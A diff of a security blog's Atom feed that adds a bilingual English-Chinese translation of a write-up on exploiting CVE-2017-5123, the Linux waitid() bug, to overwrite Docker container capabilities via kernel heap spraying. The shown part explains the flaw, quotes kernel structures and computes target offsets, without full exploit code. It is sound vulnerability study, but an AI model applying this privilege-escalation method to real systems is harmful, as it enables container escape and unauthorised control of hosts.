@@ -1,4 +1,450 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-03-22T14:48:50+08:00</updated><id>https://security-onigiri.github.io//</id><entry><title type="html">Linux ELF 二進位檔案入門：搞懂兼分析</title><link href="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html" rel="alternate" type="text/html" title="Linux ELF 二進位檔案入門：搞懂兼分析" /><published>2018-03-08T00:00:00+08:00</published><updated>2018-03-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html">&lt;h1 id=&quot;the-101-of-elf-binaries-on-linux-understanding-and-analysis&quot;&gt;The 101 of ELF Binaries on Linux: Understanding and Analysis&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-03-31T21:13:55+08:00</updated><id>https://security-onigiri.github.io//</id><entry><title type="html">使用 CVE-2017-5123 逃離 Docker 容器</title><link href="https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html" rel="alternate" type="text/html" title="使用 CVE-2017-5123 逃離 Docker 容器" /><published>2018-03-31T00:00:00+08:00</published><updated>2018-03-31T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html">&lt;p&gt;The post describes how I exploited the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; vulnerability in order to modify the &lt;a href=&quot;https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt&quot;&gt;Linux capabilities&lt;/a&gt; of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這篇文章描述我如何利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 修改 Docker 容器的 Linux capabilities 從而取得更高的權限，最後逃離了容器監獄。如果你想要看看 Twistlock 如何在他的軌跡中阻止這個弱點，在這篇&lt;a href=&quot;https://www.twistlock.com/2018/01/16/blocking-malicious-behavior-exploits-containers-twistlock/&quot;&gt;文章&lt;/a&gt;有。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;But before we dive in, since an image is worth a thousand words, here is my exploit in action. It modifies the containerized process capabilities structure in memory, resulting in a gain of &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities. This results in the ability to enable promiscuous mode on &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;(docker bridge for the container):&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;但在我們深入之前，一張圖勝過千言萬語，這是我的利用過程。它修改容器化行程在記憶體中的 capabilities 結構，導致取得 &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities。這意味著有能力開啟 &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;(容器的 docker bridge) 的混沌模式&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=IdRDFS4u2rQ&quot;&gt;Youtube 影片&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Note that I have turn off &lt;code class=&quot;highlighter-rouge&quot;&gt;Kernel ASLR&lt;/code&gt; for the recording, but it also works with &lt;code class=&quot;highlighter-rouge&quot;&gt;KASLR&lt;/code&gt; as we can find the kernel base and the heap base by using the same vulnerability.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;請留意我在影片中已經關掉 &lt;code class=&quot;highlighter-rouge&quot;&gt;Kernel ASLR&lt;/code&gt;，但在 &lt;code class=&quot;highlighter-rouge&quot;&gt;KASLR&lt;/code&gt; 的狀態下依然可以藉由同一個弱點成功找到核心基址與堆積基址。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;CVE-2017-5123 was published earlier this year on Oct 12 - it was a Linux kernel vulnerability in the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall for 4.12-4.13 kernel versions. The &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall defined as:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/cve-2017-5123&quot;&gt;CVE-2017-5123&lt;/a&gt; 是今年 8 月 12 日發布 - 它是一個在 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫的 Linux 核心 4.12-4.13 版本弱點。&lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫定義為：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;int waitid(idtype_t idtype, it_t id, siginfo_t *infop, int options);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The vulnerability allows an attacker to write a partially-controlled data to kernel memory address of his choice. The kernel memory address can be provided as the&lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt;pointer above. The pointer points to a struct siginfo described below. In this struct we can control sveral variables, specifically pid and status.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;該弱點允許一個攻擊者寫入部份可控資料到攻擊者選擇的核心記憶體位址中。核心記憶體位址可以由&lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt;指標提供。這個指標指向一個結構&lt;code class=&quot;highlighter-rouge&quot;&gt;siginfo&lt;/code&gt;如下所述。在這個結構我們可以控制數個變數，特別是&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;與&lt;code class=&quot;highlighter-rouge&quot;&gt;status&lt;/code&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;As you can see below, the control is rather indirect.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;下面如你所見，這個控制相當不直接。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;struct siginfo {
+    int si_signo;
+    int si_errno;
+    int si_code;
+    int padding; // this remains unchaged by waitid
+    int pid;     // process id
+    int uid;     // user id
+    int status;  // return code
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Most of the values cannot be controlled by us or are limited in their size for our needs, however we can control the &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; value by creating a lot of processes with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;clone()&lt;/code&gt; until we hit the desired &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; value. Still, we are limited by the &lt;code class=&quot;highlighter-rouge&quot;&gt;PID_MAX&lt;/code&gt; value of the system, which is by default configured to be 32768 which equals to 0x8000 in hex.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;多數的數值無法被我們控制，或是對我們來說在大小方面有所限制，然而我們可以藉由&lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;clone()&lt;/code&gt;的幫助創造很多行程，來控制 &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;的值，直到我們觸碰到想要的&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;為止。但我們仍受限於系統中&lt;code class=&quot;highlighter-rouge&quot;&gt;PID_MAX&lt;/code&gt;的值，預設為 &lt;em&gt;32768&lt;/em&gt; 等於 十六進位 &lt;em&gt;0x8000&lt;/em&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Note: In a non-containerized environment we could elevate this number after changing our &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; to 0 and gain root privileges, as we could modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/sys/kernel/pid_mx&lt;/code&gt; to any number.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;註：在一個非容器的環境，我們可以在將 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 設為0後提高這個數字，並取得 root 權限，如同我們可以修改 &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/sys/kernel/pid_max&lt;/code&gt; 為任何數字。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;linux-capabilities&quot;&gt;Linux Capabilities&lt;/h2&gt;
+
+&lt;p&gt;In this section I’ll focus on a short overview of Linux capabilities - what they are, how Docker uses them, and how they are represented in the memory.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;在這個章節我將專注在簡短概觀的 Linux capabilities - 它們是什麼，與Docker 如何使用它們，與它們在記憶體中如何被表示。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The code snippet below is taken from &lt;em&gt;linux/cred.h&lt;/em&gt; and is the definition of the credentails struct that each process has:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;下方是從 &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/include/linux/cred.h&quot;&gt;linux/cred.h&lt;/a&gt; 擷取的程式碼片段 ，為每個行程的認證資訊結構：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;struct cred {
+    atomic_t usage;
+#ifdef CONFIG_DEBUG_CREDENTIALS
+    atomic_t subscribers; /* number of processes subscribed */
+    void *put_addr;
+    unsigned magic;
+#define CRED_MAGIC 0x43736564
+#define CRED_MAGIC_DEAD 0x44656144
+#endif
+    kuid_t uid; /* real UID of the task */
+    kgid_t gid; /* real GID of the task */
+    kuid_t suid; /* saved UID of the task */
+    kgid_t sgid; /* saved GID of the task */
+    kgid_t euid; /* effective UID of the task */
+    kuid_t egid; /* effective GID of the task */
+    kuid_t fsuid; /* UID for VFS ops */
+    kgid_t fsgid /* GID for VFS ops */
+    Unsigned securebits; /* SUID-less security management */
+    Kernel_cap_t cap_inheritable; /* caps our children can inherit */
+    Kernel_cap_t cap_permitted; /* caps we're permitted */
+    Kernel_cap_t cap_effective; /* caps we can actually use */
+    Kernel_cap_t cap_ambient; /* Ambient capability set */
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;man capabilities:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuse into distinc units, known as &lt;em&gt;capabilities&lt;/em&gt;, which can be independently enabled and disabled. Capabilities are a per-thread attribute.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;從核心 2.2開始，Linux 將傳統與超級使用者相關聯的權限分成不同的單元，可被個別啟用及停用，並稱之為 &lt;em&gt;capabilities&lt;/em&gt;。每個執行緒都會有各自的 Capabilities 屬性。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Linux capabilities are stored inside each process’s own &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; and represented by a bitmask. For example all caps enabled would be represented by a bitmask of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF
+&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Linux capabilities 被儲存在每個行程自己的 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 並使用 bitmask 來表示。例如所有的 caps 都被啟用的話，則用 bitmask 表示成 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF
+&lt;/code&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Each capability provides a different set of permissions, for instance:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;每個 capability 提供一個不同的權限分配，舉例來說:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;CAP_SYS_MODULE&lt;/strong&gt; - allows for loading &amp;amp; unloading kernel modules.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;CAP_NET_ADMIN&lt;/strong&gt; - allows for various network operations. For example entering promiscuous mode, interface configuration and more.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;CAP_SYS_ADMIN&lt;/strong&gt; - enables a range of system administration operations such as quotactl, mount, umount, swapon, setdomainname, ptrace and much more(this cap gives the most privileges and overloads others).&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;CAP_SYS_MODULE&lt;/strong&gt; - 允許載入或卸載核心模組。&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;CAP_NET_ADMIN&lt;/strong&gt; - 允許數種網路操作，例如開啟混沌模式，介面設定等等。&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;CAP_SYS_ADMIN&lt;/strong&gt; - 啟用一個範圍內的系統管理操作，如 quotactl, mount, umount, swapon, setdomainname, ptrace 等等(這個 cap 給了最多權限並會多載其他的 cap)。
+(編按:這個權限在 Linux manual 中建議最好避免使用，畢竟會賦予非常多的權限，幾乎可以說是一個另類的 root，除非須需求幾乎等同於此 cap，否則建議能避則避。)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;You can find the full list of CAPS over here.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;你可以在&lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;這裡&lt;/a&gt;找到完整的 CAPS 清單。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Docker uses capabilites to provide a better isolation for containers. It simply drops capabilities that would enable container escape. For example, you will rarely see a container that is running out-of-the-box with any of the 3 capabilities above, as it would be security concern if a container could access the network interface and sniff the traffic of other containers or the host itself, or if a user inside the container could mount directories on the host and load kenrel modules.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Docker 使用 capabilities 來為容器提供一個較好的隔離環境。Docker 純粹的將可能造成脫離容器的 capabilities 拿掉。例如，你會幾乎看不到一個容器運行在限制之外，有著上述三個 capabilities 的任何一個，當一個容器可以存取網路介面並嗅探其他容器或是主機的流量，或是一個在容器中的使用者可以在主機上掛上目錄並且載入核心模組，這些都是有安全疑慮的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Although it might be easier to build a ROP chain and call commit_creds(0) in order to gain root with full capabilities, in order to learn more about heap spraying, I decided to go with the blind exploitation method by spraying the kernel heap with thousands of struct creds like Federico did. The downside of the this exploit is that full caps are impossible to reach as we are not in control of what we are writing(we are limited to 0x8000) and the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; is out of reach for us.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;雖然造一個 &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;ROP&lt;/a&gt;鏈來呼叫 commit_creds(0) 以獲得 root 權限與全部的 capabilities 似乎來的更簡單一點，但為了學到更多與堆積噴灑相關的技巧，並且在不知道目標環境下的漏洞利用方法，就像 Federico 做的一樣，將數千個 creds 結構噴好噴滿到核心堆積中。這個漏洞利用的缺點就是無法取得全部的 caps，因為我們無法控制寫入的東西(我們受限於 0x8000 的限制) 而且 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; 對我們來說是不可能達到的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;the-vulnerability--弱點成因&quot;&gt;The vulnerability / 弱點成因&lt;/h2&gt;
+
+&lt;p&gt;The code snippet below is taken from &lt;em&gt;kernel/exit.c&lt;/em&gt; and is in charnge of handling the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這是從 &lt;em&gt;kernel/exit.c&lt;/em&gt; 取得的程式碼片段，負責處理系統
+呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt;:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;SYSCALL_DEFINE5(waitid, int, which , pid_t, upid, struct siginfo __user *, infop, int, options, struct rusage __user *, ru)
+{
+    struct rusage r;
+    struct waitid_info info = {.status = 0};
+    
+    long err = kernel_waitid(which, upid, &amp;amp;info, options, ru ? &amp;amp;r : NULL);
+    
+    int signo = 0;
+    
+    if (err &amp;gt; 0) {
+        signo = SIGCHLD;
+        err = 0;
+        if (ru &amp;amp;&amp;amp; copy_to_user(ru, &amp;amp;r, sizeof(sturct rusage)))
+        return -EFAULT;
+    }
+    if (!infop)
+        return err;
+    
+    if (!/*醒目*/access_ok/*提示*/(VERIFY_WRITE, infop, sizeof(*infop)))
+        return -EFAULT; 
+    user_access_begin();
+    unsafe_put_user(signo, &amp;amp;infop-&amp;gt;si_signo, Efault);
+    unsafe_put_user(0, &amp;amp;infop-&amp;gt;si_errno, Efault);
+    unsafe_put_user(info.cause, &amp;amp;infop-&amp;gt;si_code, Efault);
+    unsafe_put_user(info.pid, &amp;amp;infop-&amp;gt;si_pid, Efault);
+    unsafe_put_user(info.uid, &amp;amp;infop-&amp;gt;si_uid, Efault);
+    unsafe_put_user(info.status, &amp;amp;infop-si_status, Efault);
+    user_access_end();
+    return err;
+Efault:
+    user_access_end();
+    return -EFAULT;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The vulnerability is that the highlighted &lt;code class=&quot;highlighter-rouge&quot;&gt;access_ok()&lt;/code&gt; check, which ensures that the user specified pointer is in face a user-space pointer, was missing in the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall. Without this check a user can supply a kernel address pointer and the syscall will write to it without objections when executing &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;弱點在於有醒目提示的 &lt;code class=&quot;highlighter-rouge&quot;&gt;access_ok()&lt;/code&gt; 檢查，用來保證使用者指定的指標是屬於使用者空間的指標，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫中少了這個檢查，缺了這個檢查，使用者可以提供一個核心地址指標，當執行 &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user&lt;/code&gt; 時系統呼叫會毫無異議的寫入該位址。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;As we already know - we can’t simply write whatever we want, but we will have to try to gain as much as we can within these limitations.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如同我們已經知道的 - 我們不能任意的想寫入哪裡就寫入哪裡，但我們必須在這些限制之下，竭盡我們所能的嘗試獲取可寫位址。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Info.status&lt;/code&gt; is a 32bit int, but the value of status is constrained to 0 &amp;lt; status &amp;lt; 256 as we can ses in the exit codes documentation, and as we already know&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;is constrained by&lt;code class=&quot;highlighter-rouge&quot;&gt;MAX_PID&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Info.status&lt;/code&gt;是一個 32bit 整數，但狀態的值被約束在 0 與 256 之間，就像我們在 exit 程式碼文件看到的，同時我們也知道&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;被&lt;code class=&quot;highlighter-rouge&quot;&gt;MAX_PID&lt;/code&gt;約束了。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;At this point we have the ability to write a value of pid: 0 &amp;lt; pid &amp;lt; 0x8000 to anywhere we want. The next challenge is to detect where we should write in order to successfully overwirte the desired values.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;目前我們有寫入 pid 值得能力: 介於 0 到 0x8000，到任意我們想要的地方，下一個挑戰是偵測到我們該寫到的位置，才能成功的覆寫想要的值。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We need to rememer that the syscall will actually write 6 different fields each time we execute it, as there will be 6 executions of &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user()&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們需要記得，系統呼叫在每次執行的時候，實際上會寫入 6 個不同欄位，因為有 6 個 &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user()&lt;/code&gt; 被執行了。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So we will need to take into account the offset of &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; sturct and use it to subtract that value from the target address into &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall as the &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; pointer.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;所以我們需要帶入 &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; 結構中 &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; 的帳戶偏移值，並使用它減去到 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 呼叫的目標位址的值作為 &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; 指標。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Our main goal with this exploit is to overwrite the capabilities that Docker sets for us, thus gaining additional privileges and to escape the container.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們使用這個漏洞利用的主要目標是，覆寫 Docker 為我們設定的 capabilities，就可以獲得額外的權限並且逃離容器。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;spray-n-pray--噴灑並禱告&quot;&gt;Spray n’ Pray / 噴灑並禱告&lt;/h2&gt;
+
+&lt;p&gt;I decided to take an approach similar to Federico, so I proceeded to spray the kernel heap with thousands of struct &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; and then start guessing by writing to various addresses and pray to hit my target.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我決定使用與 Federico 相似的方法，所以我用數千個 &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; 結構將核心堆積噴好噴滿，然後開始透過寫入不同位址來猜測，禱告並祈求可以擊中我的目標。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;By picking a value that we can track such as &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; (which we can track with getuid()).&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;藉著選一個我們可以追蹤的值如 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; (我們可以使用 getuid() 來追蹤)。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We can, with a little bit a luck, pinpoint our &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; location, after which we will be able to write to specific offsets in order to overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;capabilities&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; and anything else we want.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;幸運的話，我們可以做到的，指向我們的 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; 位置，之後我們將能寫到指定的偏移，就可以覆寫 &lt;code class=&quot;highlighter-rouge&quot;&gt;capabilities&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; 與其他任何我們想要的東西。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;But in order to do that we need to figure out the actual offsets, which we will do with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;但為了要實現，我們需要搞清楚真實的偏移值，我們將依靠 &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; 的幫助來實現:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, &lt;code class=&quot;highlighter-rouge&quot;&gt;kuid_t&lt;/code&gt; is 4 bytes in size, as such if we found uid on &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1004&lt;/code&gt; than &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; will be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1008&lt;/code&gt;, 4 bytes above, and &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; will be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023CC1014&lt;/code&gt; which is 4*0x4=0x10 bytes above our &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; address as illustrated in the diagram below.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;猶如我們看到的， &lt;code class=&quot;highlighter-rouge&quot;&gt;kuid_t&lt;/code&gt; 是 4 個位元組的大小，因為醬子，如果我們在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1004&lt;/code&gt; 發現 uid ，那麼 &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; 會在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1008&lt;/code&gt;， 4 個位元組之上，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; 會在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023CC1014&lt;/code&gt;，就是 4*0x4=0x10(編按: 0x開頭是16進位，並非0乘4) 位元組之上，我們的 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 位址，如下圖所示。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So essentially in order to overwite our caps will have to write to:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;所以重要的是為了覆寫我們的 caps 將必須寫到:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;address_of_uid+0x4*8 = address_of_uid+0x20 = address_of_cap_inferitable&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Note: These addresses are relevant to my system, your addresses might differ.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;註: 這些位址跟我的系統有相關聯，你的位址可能會不一樣。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In order to find out where our sprayed &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; might land in the heap we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; again and set a breakpoint on &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_getuid&lt;/code&gt; in order to break when our program calls &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;為了找到我們噴灑的 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; 在堆積中可能的落點，我們將再次使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; 並設置一個中斷點在 &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_getuid&lt;/code&gt; 上，以便在程式呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; 的時候中斷下來。&lt;/p&gt;
+&lt;/blockquote&gt;
+
